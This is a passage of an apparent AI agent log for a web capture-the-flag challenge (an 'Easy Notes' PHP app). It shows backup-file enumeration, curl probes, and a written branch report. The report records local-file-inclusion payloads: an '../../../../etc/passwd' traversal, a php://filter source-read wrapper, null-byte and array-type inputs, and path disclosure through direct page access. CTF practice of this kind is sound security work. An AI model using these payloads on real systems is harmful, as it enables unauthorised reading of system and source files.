+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /config.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:38 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:39 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /lib.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 320
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 318
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.swp ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.swo ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 318
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 318
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.save ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:42 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.old ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:42 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+=== /init.php.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:42 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+
+codex
+The source-extension pass is still running because it covered the discovered root files and duplicate extension forms; so far every backup/source extension is 404. I’m waiting for it to finish, then I’ll write the branch result.
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+One additional `page`-specific edge worth checking is type confusion (`page[]=`), since PHP apps often leak stack traces when route validation expects a string. I’m testing that before closing the branch.
+exec
+/bin/bash -lc "for u in '?page%5B%5D=home' '?page%5B%5D=flag' '?page=' '?page=0' '?page=true' '?page=HOME' '?page=home%00' '?page=flag%00' '?page=home.php' '?page=pages/home'; do printf '\\n=== %s ===\\n' \""'$u"; curl -sS -i --max-time 8 --path-as-is "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/$u" | sed -n '"'1,30p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 1104ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=2bb7f7cebb7cb7cb9de33d7d9a4f84d8; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ?page= ===
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=f8bb87638a5033dbde099d390829ad59; path=/
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <title>Easy Notes</title>
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="/">Easy Notes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarDropdown" aria-controls="navbarDropdown" aria-expanded="false" aria-label="Toggle navigation">
+
+=== ?page=0 ===
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=5258617878c3659215903d0f10ea07cc; path=/
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <title>Easy Notes</title>
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="/">Easy Notes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarDropdown" aria-controls="navbarDropdown" aria-expanded="false" aria-label="Toggle navigation">
+
+=== ?page=true ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=5c98b24d41e033e868e79c3f9d6e31bf; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ?page=HOME ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=45382b0b6b3886274307b85b776bfabe; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ?page=home%00 ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=778606da7231699b73c0335de00692ba; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ?page=flag%00 ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:02 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=ae4b59c10581b4d2bd2e6e49029d1a9d; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ?page=home.php ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:03 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=eae183dcc04b92f0cb0010711d73f789; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ?page=pages/home ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:39:03 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=0508c5a8b31ea8d306ec53102c0182dc; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+The `page[]` and null-byte edge cases did not produce route validation warnings; they fall back or redirect. I have enough to close the branch: no LFI/wrapper/source file read, but direct PHP fragment access discloses the `/var/www/html/pages/...` routes including the flag fragment path.
+exec
+/bin/bash -lc 'test -e /home/stw/ctf-agent/challenges/manual_web_920544e8040f/branch_result_branch_001.md && printf exists || printf missing' in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+missing
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+I’m writing the branch result now, limited to the requested `branch_result_branch_001.md` file.
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+diff --git a/challenges/manual_web_920544e8040f/branch_result_branch_001.md b/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..e91d959323bcd0072ab5be65861f1ec94a148e8f
+--- /dev/null
++++ b/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+@@ -0,0 +1,60 @@
++## Branch Result
++direction: page-lfi-route-probe
++subagent_id: branch_001
++status: FEASIBLE
++
++### 发现
++- `?page=` appears route-mapped/validated. Valid unauthenticated pages: `home`, `login`, `flag`; invalid names, traversal, encoded traversal, null-byte suffixes, and PHP wrappers redirect to `/?page=home`.
++- Direct PHP fragments under `/pages/` are web-accessible and disclose absolute filesystem paths via fatal errors when called outside `index.php`.
++- Flag route path disclosed: `/var/www/html/pages/flag.php`. Direct request to `/pages/flag.php` calls undefined `is_admin()` and leaks the path and line number.
++- Arbitrary username login is accepted via `POST /login.php user=probe_user`, revealing authenticated routes: `?page=notes`, `?page=add`, `?page=note`, and action routes `export.php?type=zip|tar`. This did not grant admin.
++- No confirmed LFI/file-read via `?page=`, no PHP wrapper inclusion, and no backup/source extension disclosure found in this branch.
++
++### 命令和结果
++```bash
++curl -i -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=flag'
++```
++Result: `200 OK`, body includes `<h2>Get flag</h2>` and `You are not an admin :(`.
++
++```bash
++curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=../../../../etc/passwd'
++curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=php://filter/convert.base64-encode/resource=index'
++```
++Result: both return `302 Found` with `Location: /?page=home`; no `/etc/passwd` or base64 source output.
++
++```bash
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/flag.php'
++```
++Result excerpt:
++```html
++Fatal error: Uncaught Error: Call to undefined function is_admin() in /var/www/html/pages/flag.php:5
++```
++
++```bash
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/home.php'
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/notes.php'
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/note.php'
++```
++Results:
++- `/pages/home.php`: fatal `undefined function is_logged_in()` at `/var/www/html/pages/home.php:5`.
++- `/pages/notes.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/notes.php:2`.
++- `/pages/note.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/note.php:2`.
++
++```bash
++sid=$(curl -sS -i -X POST 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/login.php' --data 'user=probe_user' | awk -F'[=;]' '/Set-Cookie: PHPSESSID=/{print $2; exit}')
++curl -sS -i -H "Cookie: PHPSESSID=$sid" 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=home'
++```
++Result: logged-in navbar exposes `?page=notes`, `?page=add`, `export.php?type=zip`, and `export.php?type=tar`.
++
++```bash
++# Source/backup disclosure spot checks on discovered files:
++/index.php~ /index.phps /index.php.bak
++/login.php~ /login.phps /login.php.bak
++/config.php~ /config.phps /config.php.bak
++/lib.php~ /lib.phps /lib.php.bak
++/pages/flag.php~ /pages/flag.phps /pages/flag.php.bak
++```
++Result: checked variants returned `404 Not Found`; normal `/config.php`, `/lib.php`, `/init.php` execute with empty output.
++
++### 结论
++可行。`?page` 本身未确认 LFI/path traversal/wrapper 读文件，但直接访问 `/pages/*.php` 泄露了路由和绝对路径，包含 flag 页面路径 `/var/www/html/pages/flag.php`；登录任意用户名还可枚举登录态页面路由。建议主线优先围绕已披露的 `/pages/flag.php`、`is_admin()`、`lib.php/config.php/init.php`、登录态路由和导出功能继续分析。
+
+diff --git a/challenges/manual_web_920544e8040f/branch_result_branch_001.md b/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..e91d959323bcd0072ab5be65861f1ec94a148e8f
+--- /dev/null
++++ b/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+@@ -0,0 +1,60 @@
++## Branch Result
++direction: page-lfi-route-probe
++subagent_id: branch_001
++status: FEASIBLE
++
++### 发现
++- `?page=` appears route-mapped/validated. Valid unauthenticated pages: `home`, `login`, `flag`; invalid names, traversal, encoded traversal, null-byte suffixes, and PHP wrappers redirect to `/?page=home`.
++- Direct PHP fragments under `/pages/` are web-accessible and disclose absolute filesystem paths via fatal errors when called outside `index.php`.
++- Flag route path disclosed: `/var/www/html/pages/flag.php`. Direct request to `/pages/flag.php` calls undefined `is_admin()` and leaks the path and line number.
++- Arbitrary username login is accepted via `POST /login.php user=probe_user`, revealing authenticated routes: `?page=notes`, `?page=add`, `?page=note`, and action routes `export.php?type=zip|tar`. This did not grant admin.
++- No confirmed LFI/file-read via `?page=`, no PHP wrapper inclusion, and no backup/source extension disclosure found in this branch.
++
++### 命令和结果
++```bash
++curl -i -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=flag'
++```
++Result: `200 OK`, body includes `<h2>Get flag</h2>` and `You are not an admin :(`.
++
++```bash
++curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=../../../../etc/passwd'
++curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=php://filter/convert.base64-encode/resource=index'
++```
++Result: both return `302 Found` with `Location: /?page=home`; no `/etc/passwd` or base64 source output.
++
++```bash
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/flag.php'
++```
++Result excerpt:
++```html
++Fatal error: Uncaught Error: Call to undefined function is_admin() in /var/www/html/pages/flag.php:5
++```
++
++```bash
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/home.php'
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/notes.php'
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/note.php'
++```
++Results:
++- `/pages/home.php`: fatal `undefined function is_logged_in()` at `/var/www/html/pages/home.php:5`.
++- `/pages/notes.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/notes.php:2`.
++- `/pages/note.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/note.php:2`.
++
++```bash
++sid=$(curl -sS -i -X POST 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/login.php' --data 'user=probe_user' | awk -F'[=;]' '/Set-Cookie: PHPSESSID=/{print $2; exit}')
++curl -sS -i -H "Cookie: PHPSESSID=$sid" 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=home'
++```
++Result: logged-in navbar exposes `?page=notes`, `?page=add`, `export.php?type=zip`, and `export.php?type=tar`.
++
++```bash
++# Source/backup disclosure spot checks on discovered files:
++/index.php~ /index.phps /index.php.bak
++/login.php~ /login.phps /login.php.bak
++/config.php~ /config.phps /config.php.bak
++/lib.php~ /lib.phps /lib.php.bak
++/pages/flag.php~ /pages/flag.phps /pages/flag.php.bak
++```
++Result: checked variants returned `404 Not Found`; normal `/config.php`, `/lib.php`, `/init.php` execute with empty output.
++
++### 结论
++可行。`?page` 本身未确认 LFI/path traversal/wrapper 读文件，但直接访问 `/pages/*.php` 泄露了路由和绝对路径，包含 flag 页面路径 `/var/www/html/pages/flag.php`；登录任意用户名还可枚举登录态页面路由。建议主线优先围绕已披露的 `/pages/flag.php`、`is_admin()`、`lib.php/config.php/init.php`、登录态路由和导出功能继续分析。
+
+codex
+Wrote `/home/stw/ctf-agent/challenges/manual_web_920544e8040f/branch_result_branch_001.md`.
+
+Status: `FEASIBLE` due direct `/pages/*.php` route/path disclosure, including `/var/www/html/pages/flag.php`. No confirmed `?page=` LFI/php-wrapper file read.
+diff --git a/challenges/manual_web_920544e8040f/branch_result_branch_001.md b/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..e91d959323bcd0072ab5be65861f1ec94a148e8f
+--- /dev/null
++++ b/challenges/manual_web_920544e8040f/branch_result_branch_001.md
+@@ -0,0 +1,60 @@
++## Branch Result
++direction: page-lfi-route-probe
++subagent_id: branch_001
++status: FEASIBLE
++
++### 发现
++- `?page=` appears route-mapped/validated. Valid unauthenticated pages: `home`, `login`, `flag`; invalid names, traversal, encoded traversal, null-byte suffixes, and PHP wrappers redirect to `/?page=home`.
++- Direct PHP fragments under `/pages/` are web-accessible and disclose absolute filesystem paths via fatal errors when called outside `index.php`.
++- Flag route path disclosed: `/var/www/html/pages/flag.php`. Direct request to `/pages/flag.php` calls undefined `is_admin()` and leaks the path and line number.
++- Arbitrary username login is accepted via `POST /login.php user=probe_user`, revealing authenticated routes: `?page=notes`, `?page=add`, `?page=note`, and action routes `export.php?type=zip|tar`. This did not grant admin.
++- No confirmed LFI/file-read via `?page=`, no PHP wrapper inclusion, and no backup/source extension disclosure found in this branch.
++
++### 命令和结果
++```bash
++curl -i -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=flag'
++```
++Result: `200 OK`, body includes `<h2>Get flag</h2>` and `You are not an admin :(`.
++
++```bash
++curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=../../../../etc/passwd'
++curl -i -sS --path-as-is 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=php://filter/convert.base64-encode/resource=index'
++```
++Result: both return `302 Found` with `Location: /?page=home`; no `/etc/passwd` or base64 source output.
++
++```bash
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/flag.php'
++```
++Result excerpt:
++```html
++Fatal error: Uncaught Error: Call to undefined function is_admin() in /var/www/html/pages/flag.php:5
++```
++
++```bash
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/home.php'
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/notes.php'
++curl -sS 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/note.php'
++```
++Results:
++- `/pages/home.php`: fatal `undefined function is_logged_in()` at `/var/www/html/pages/home.php:5`.
++- `/pages/notes.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/notes.php:2`.
++- `/pages/note.php`: fatal `undefined function get_notes()` at `/var/www/html/pages/note.php:2`.
++
++```bash
++sid=$(curl -sS -i -X POST 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/login.php' --data 'user=probe_user' | awk -F'[=;]' '/Set-Cookie: PHPSESSID=/{print $2; exit}')
++curl -sS -i -H "Cookie: PHPSESSID=$sid" 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=home'
++```
++Result: logged-in navbar exposes `?page=notes`, `?page=add`, `export.php?type=zip`, and `export.php?type=tar`.
++
++```bash
++# Source/backup disclosure spot checks on discovered files:
++/index.php~ /index.phps /index.php.bak
++/login.php~ /login.phps /login.php.bak
++/config.php~ /config.phps /config.php.bak
++/lib.php~ /lib.phps /lib.php.bak
++/pages/flag.php~ /pages/flag.phps /pages/flag.php.bak
++```
++Result: checked variants returned `404 Not Found`; normal `/config.php`, `/lib.php`, `/init.php` execute with empty output.
++
++### 结论
++可行。`?page` 本身未确认 LFI/path traversal/wrapper 读文件，但直接访问 `/pages/*.php` 泄露了路由和绝对路径，包含 flag 页面路径 `/var/www/html/pages/flag.php`；登录任意用户名还可枚举登录态页面路由。建议主线优先围绕已披露的 `/pages/flag.php`、`is_admin()`、`lib.php/config.php/init.php`、登录态路由和导出功能继续分析。
+
+tokens used
+77,686
+Wrote `/home/stw/ctf-agent/challenges/manual_web_920544e8040f/branch_result_branch_001.md`.
+
+Status: `FEASIBLE` due direct `/pages/*.php` route/path disclosure, including `/var/www/html/pages/flag.php`. No confirmed `?page=` LFI/php-wrapper file read.
